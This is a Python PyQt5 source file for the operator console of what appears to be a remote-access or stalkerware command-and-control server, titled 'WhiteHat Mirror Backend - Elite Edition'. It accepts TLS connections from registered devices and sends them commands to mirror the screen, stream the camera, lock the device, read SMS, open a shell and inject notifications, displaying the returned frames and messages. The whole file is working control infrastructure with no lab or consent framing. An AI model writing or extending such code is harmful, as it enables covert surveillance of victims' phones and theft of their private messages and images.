import sys
import os
import socket
import threading
import json
import ssl
import warnings

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QTextEdit, QPushButton,
    QListWidget, QLineEdit, QLabel, QStackedWidget
)

from PyQt5.QtGui import QIcon, QTextCursor
from PyQt5.QtCore import Qt, qRegisterMetaType , pyqtSignal, QObject



# --- Suppress DeprecationWarnings and PNG sRGB warnings ---
warnings.filterwarnings("ignore", category=DeprecationWarning)
os.environ["QT_LOGGING_RULES"] = "qt.gui.icc=false"

# --- Register QTextCursor to suppress QObject::connect warning ---
qRegisterMetaType(QTextCursor)

# --- Try importing all modules, fallback to dummy widget if missing ---
def safe_import(module_path, class_name):
    try:
        module = __import__(module_path, fromlist=[class_name])
        return getattr(module, class_name)
    except Exception as e:
        def DummyWidget(*args, **kwargs):
            w = QWidget()
            layout = QVBoxLayout()
            w.setLayout(layout)
            layout.addWidget(QLabel(f"<b style='color:red'>Module '{class_name}' not found or failed to load.<br>{e}</b>"))
            return w
        return DummyWidget

MirrorWidget = safe_import("modules.mirror", "MirrorWidget")
def CameraWidgetFactory(device_id, send_command_callback):
    return safe_import("modules.camera", "CameraWidget")(device_id, send_command_callback)

FileExplorerWidget = safe_import("modules.fileexplorer", "FileExplorerWidget")
ShellWidget = safe_import("modules.shell", "ShellWidget")
AudioWidget = safe_import("modules.audio", "AudioWidget")
NotificationWidget = safe_import("modules.notification", "NotificationWidget")
OCRWidget = safe_import("modules.ocr", "OCRWidget")
AppManagerWidget = safe_import("modules.appmanager", "AppManagerWidget")
GeofencingWidget = safe_import("modules.geofencing", "GeofencingWidget")
VPNWidget = safe_import("modules.vpn", "VPNWidget")
UpdateWidget = safe_import("modules.update", "UpdateWidget")
PolicyWidget = safe_import("modules.policy", "PolicyWidget")
NotificationInjectWidget = safe_import("modules.notification_inject", "NotificationInjectWidget")
DesktopWidget = safe_import("modules.desktop", "DesktopWidget")
ScreenRecordWidget = safe_import("modules.screenrecord", "ScreenRecordWidget")
AlertsWidget = safe_import("modules.alerts", "AlertsWidget")
MapViewWidget = safe_import("modules.mapview", "MapViewWidget")
TeamWidget = safe_import("modules.team", "TeamWidget")
PluginManagerWidget = safe_import("modules.pluginmanager", "PluginManagerWidget")
ReportingWidget = safe_import("modules.reporting", "ReportingWidget")
ClusteringWidget = safe_import("modules.clustering", "ClusteringWidget")
SessionReplayWidget = safe_import("modules.sessionreplay", "SessionReplayWidget")
LLMPluginWidget = safe_import("modules.llmplugin", "LLMPluginWidget")
AdminWidget = safe_import("modules.admin", "AdminWidget")
SMSWidget = safe_import("modules.sms", "SMSWidget")

SERVER_IP = "0.0.0.0"
SERVER_PORT = 442
SSL_CERT = "server.crt"
SSL_KEY = "server.key"
clients = {}

class BackendGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WhiteHat Mirror Backend - Elite Edition")
        self.setGeometry(50, 50, 1600, 900)
        self.setStyleSheet(open("gui/style.qss").read() if os.path.exists("gui/style.qss") else "")

        main_widget = QWidget()
        main_layout = QHBoxLayout(main_widget)
        self.setCentralWidget(main_widget)

        # Sidebar
        sidebar = QVBoxLayout()
        sidebar.setAlignment(Qt.AlignTop)
        self.clientList = QListWidget()
        sidebar.addWidget(QLabel("<font color='lime'>Clients</font>"))
        sidebar.addWidget(self.clientList)
        self.sidebar_buttons = {}
        self.sidebar_labels = [
            ("Dashboard", "dashboard.png"),
            ("Mirror", "mirror.png"),
            ("Camera", "camera.png"),
            ("File Explorer", "fileexplorer.png"),
            ("Shell", "shell.png"),
            ("Audio", "audio.png"),
            ("Notification", "notification.png"),
            ("OCR", "ocr.png"),
            ("App Manager", "appmanager.png"),
            ("Geofencing", "geofencing.png"),
            ("VPN", "vpn.png"),
            ("Update", "update.png"),
            ("Policy", "policy.png"),
            ("Notification Inject", "notificationinject.png"),
            ("Desktop", "desktop.png"),
            ("Screen Record", "screenrecord.png"),
            ("Alerts", "alerts.png"),
            ("Map", "map.png"),
            ("Team", "team.png"),
            ("Plugins", "plugin.png"),
            ("Reports", "report.png"),
            ("Clustering", "clustering.png"),
            ("Session Replay", "replay.png"),
            ("AI/LLM", "ai.png"),
            ("Admin", "admin.png"),
            ("SMS", "sms.png"),
            ("Settings", "settings.png")
        ]
        for label, icon in self.sidebar_labels:
            btn = QPushButton(QIcon(f"gui/icons/{icon}"), label)
            btn.setStyleSheet("color: red; background: #111; border: none;")
            sidebar.addWidget(btn)
            self.sidebar_buttons[label] = btn
        main_layout.addLayout(sidebar, 1)

        # Main area (stacked widget for modules)
        self.stacked = QStackedWidget()
        main_layout.addWidget(self.stacked, 4)

        # Add a log tab as default
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.setStyleSheet("color: #f44; background: #000; border: 1px solid red;")
        self.stacked.addWidget(self.log)
        self.stacked.setCurrentWidget(self.log)

        # Store module widgets (only create once)
        self.module_widgets = {}

        # Connect sidebar buttons to switch modules
        for label, btn in self.sidebar_buttons.items():
            btn.clicked.connect(lambda _, l=label: self.switch_module(l))

        # Command input
        self.commandInput = QLineEdit()
        self.commandInput.setPlaceholderText("Enter command (e.g., MIRROR_SCREEN, CAMERA_STREAM:FRONT, LOCK_DEVICE, etc.)")
        self.commandInput.setStyleSheet("color: #fff; background: #222; border: 1px solid red;")
        sidebar.addWidget(self.commandInput)
        self.sendBtn = QPushButton("Send Command to Selected Client")
        self.sendBtn.setStyleSheet("color: #fff; background: #900; border: 1px solid red;")
        self.sendBtn.clicked.connect(self.send_command)
        sidebar.addWidget(self.sendBtn)

        # Per-device module windows
        self.mirror_windows = {}
        self.camera_windows = {}
        self.adminwindows = {}
        self.smswindows = {}

    def log_message(self, msg):
        self.log.append(msg)

    def update_clients(self):
        self.clientList.clear()
        for device_id, info in clients.items():
            self.clientList.addItem(f"{device_id} | {info.get('info', '')}")

    def send_command(self):
        item = self.clientList.currentItem()
        cmd = self.commandInput.text().strip()
        if item and cmd:
            device_id = item.text().split(" | ")[0]
            conn = clients[device_id]["conn"]
            try:
                conn.sendall((cmd + "\n").encode())
                self.log_message(f"Sent to {device_id}: {cmd}")
                if cmd.upper().startswith("MIRROR_SCREEN"):
                    self.open_mirror(device_id)
                elif cmd.upper().startswith("CAMERA_STREAM"):
                    self.open_camera(device_id)
                elif cmd.upper().startswith("ADMIN"):
                    self.open_admin(device_id)
                elif cmd.upper().startswith("SMS"):
                    self.open_sms(device_id)
            except Exception as e:
                self.log_message(f"Error sending to {device_id}: {e}")

    def switch_module(self, label):
        self.log_message(f"Switched to {label}")

        per_device_modules = {
            "Mirror": lambda device_id: MirrorWidget(device_id),
            "Camera": lambda device_id: CameraWidgetFactory(device_id, self.send_command_to_device),
        }

        if label in per_device_modules:
            item = self.clientList.currentItem()
            if not item:
                w = QWidget()
                w.setLayout(QVBoxLayout())
                w.layout().addWidget(QLabel("Select a client from the list to open this module."))
                self.module_widgets[label] = w
                self.stacked.addWidget(w)
                self.stacked.setCurrentWidget(w)
                return
            device_id = item.text().split(" | ")[0]
            key = f"{label}_{device_id}"
            if key not in self.module_widgets:
                self.module_widgets[key] = per_device_modules[label](device_id)
                self.stacked.addWidget(self.module_widgets[key])
            self.stacked.setCurrentWidget(self.module_widgets[key])
            return

        if label not in self.module_widgets:
            if label == "Dashboard":
                self.module_widgets[label] = self.log
            elif label == "File Explorer":
                self.module_widgets[label] = FileExplorerWidget("dummy_id")
            elif label == "Shell":
                self.module_widgets[label] = ShellWidget("dummy_id")
            elif label == "Audio":
                self.module_widgets[label] = AudioWidget("dummy_id")
            elif label == "Notification":
                self.module_widgets[label] = NotificationWidget("dummy_id")
            elif label == "OCR":
                self.module_widgets[label] = OCRWidget("dummy_id")
            elif label == "App Manager":
                self.module_widgets[label] = AppManagerWidget("dummy_id", self.send_command_to_device)
            elif label == "Geofencing":
                self.module_widgets[label] = GeofencingWidget("dummy_id")
            elif label == "VPN":
                self.module_widgets[label] = VPNWidget("dummy_id")
            elif label == "Update":
                self.module_widgets[label] = UpdateWidget("dummy_id")
            elif label == "Policy":
                self.module_widgets[label] = PolicyWidget("dummy_id")
            elif label == "Notification Inject":
                self.module_widgets[label] = NotificationInjectWidget("dummy_id")
            elif label == "Desktop":
                self.module_widgets[label] = DesktopWidget("dummy_id")
            elif label == "Screen Record":
                self.module_widgets[label] = ScreenRecordWidget("dummy_id")
            elif label == "Alerts":
                self.module_widgets[label] = AlertsWidget("dummy_id")
            elif label == "Map":
                self.module_widgets[label] = MapViewWidget("dummy_id")
            elif label == "Team":
                self.module_widgets[label] = TeamWidget("dummy_id")
            elif label == "Plugins":
                self.module_widgets[label] = PluginManagerWidget("dummy_id")
            elif label == "Reports":
                self.module_widgets[label] = ReportingWidget("dummy_id")
            elif label == "Clustering":
                self.module_widgets[label] = ClusteringWidget("dummy_id")
            elif label == "Session Replay":
                self.module_widgets[label] = SessionReplayWidget("dummy_id")
            elif label == "AI/LLM":
                self.module_widgets[label] = LLMPluginWidget("dummy_id", backend=None)
            elif label == "Admin":
                self.module_widgets[label] = AdminWidget("dummy_id", self.send_command_to_device)
            elif label == "SMS":
                self.module_widgets[label] = SMSWidget("dummy_id", self.send_command_to_device)
            elif label == "Settings":
                w = QWidget()
                w.setLayout(QVBoxLayout())
                w.layout().addWidget(QLabel("Settings coming soon."))
                self.module_widgets[label] = w
            else:
                w = QWidget()
                w.setLayout(QVBoxLayout())
                w.layout().addWidget(QLabel(f"Module '{label}' not implemented."))
                self.module_widgets[label] = w
            self.stacked.addWidget(self.module_widgets[label])

        self.stacked.setCurrentWidget(self.module_widgets[label])

    def open_mirror(self, device_id):
        if device_id not in self.mirror_windows:
            win = MirrorWidget(device_id)
            self.mirror_windows[device_id] = win
            win.show()

    def update_mirror(self, device_id, img_bytes):
        if device_id in self.mirror_windows:
            self.mirror_windows[device_id].update_image(img_bytes)
        key = f"Mirror_{device_id}"
        widget = self.module_widgets.get(key)
        if widget and hasattr(widget, "update_image"):
            widget.update_image(img_bytes)

    def open_camera(self, device_id):
        if device_id not in self.camera_windows:
            win = CameraWidgetFactory(device_id, self.send_command_to_device)
            self.camera_windows[device_id] = win
            win.show()

    def update_camera(self, device_id, img_bytes):
        if device_id in self.camera_windows:
            self.camera_windows[device_id].update_image(img_bytes)
        key = f"Camera_{device_id}"
        widget = self.module_widgets.get(key)
        if widget and hasattr(widget, "update_image"):
            widget.update_image(img_bytes)

    def open_admin(self, device_id):
        if device_id not in self.adminwindows:
            win = AdminWidget(device_id, self.send_command_to_device)
            self.adminwindows[device_id] = win
            win.show()

    def update_admin(self, device_id, text):
        if device_id in self.adminwindows:
            self.adminwindows[device_id].update_status(text)

    def open_sms(self, device_id):
        if device_id not in self.smswindows:
            win = SMSWidget(device_id, self.send_command_to_device)
            self.smswindows[device_id] = win
            win.show()

    def update_sms(self, device_id, text):
        if device_id in self.smswindows:
            self.smswindows[device_id].update_sms(text)

    def send_command_to_device(self, device_id, cmd):
        if device_id in clients:
            conn = clients[device_id]["conn"]
            try:
                conn.sendall((cmd + "\n").encode())
                self.log_message(f"Sent to {device_id}: {cmd}")
            except Exception as e:
                self.log_message(f"Error sending to {device_id}: {e}")

def handle_client(conn, addr, gui):
    device_id = None
    try:
        while True:
            data = conn.recv(4096*8)
            if not data:
                break
            msg = data.decode("utf-8", errors="replace")
            if msg.startswith("REGISTER:"):
                device_id = msg.split(":", 1)[1].strip()
                clients[device_id] = {"conn": conn, "addr": addr, "info": f"{addr}"}
                gui.log_message(f"Device registered: {device_id} from {addr}")
                gui.update_clients()
                devices = [{"device_id": d, "info": info["info"], "status": "online"} for d, info in clients.items()]
                backend_json = json.dumps({
                    "devices": devices,
                    "log": f"Device {device_id} connected.",
                    "deviceHealth": {"battery": 87, "cpu": 23, "ram": 60},
                    "aiSummary": "No threats detected.",
                    "deviceAlerts": ["SIM changed", "Geofence exit"]
                })
                try:
                    conn.sendall(backend_json.encode() + b"\n")
                except Exception:
                    pass
            elif msg.startswith("MIRROR_FRAME:"):
                parts = msg.split(":")
                if len(parts) >= 3:
                    frame_size = int(parts[2])
                    img_bytes = b''
                    while len(img_bytes) < frame_size:
                        chunk = conn.recv(frame_size - len(img_bytes))
                        if not chunk:
                            break
                        img_bytes += chunk
                    gui.update_mirror(device_id, img_bytes)
            elif msg.startswith("CAMERA_FRAME:"):
                parts = msg.split(":")
                if len(parts) >= 3:
                    frame_size = int(parts[2])
                    img_bytes = b''
                    while len(img_bytes) < frame_size:
                        chunk = conn.recv(frame_size - len(img_bytes))
                        if not chunk:
                            break
                        img_bytes += chunk
                    gui.update_camera(device_id, img_bytes)
            elif msg.startswith("ADMIN_STATUS:"):
                status = msg.split(":", 2)[2]
                gui.update_admin(device_id, status)
            elif msg.startswith("SMS_INBOX:"):
                sms = msg.split(":", 2)[2]
                gui.update_sms(device_id, sms)
            else:
                gui.log_message(f"[{device_id}] {msg.strip()}")
    except Exception as e:
        gui.log_message(f"Client error: {e}")
    finally:
        if device_id and device_id in clients:
            del clients[device_id]
            gui.update_clients()
        conn.close()

def server_thread(gui):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((SERVER_IP, SERVER_PORT))
    s.listen(100)
    gui.log_message(f"Server listening on {SERVER_IP}:{SERVER_PORT} (SSL enabled)")
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=SSL_CERT, keyfile=SSL_KEY)
    while True:
        conn, addr = s.accept()
        try:
            ssl_conn = context.wrap_socket(conn, server_side=True)
            threading.Thread(target=handle_client, args=(ssl_conn, addr, gui), daemon=True).start()
        except Exception as e:
            gui.log_message(f"SSL error: {e}")
            conn.close()

def main():
    app = QApplication(sys.argv)
    gui = BackendGUI()
    threading.Thread(target=server_thread, args=(gui,), daemon=True).start()
    gui.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()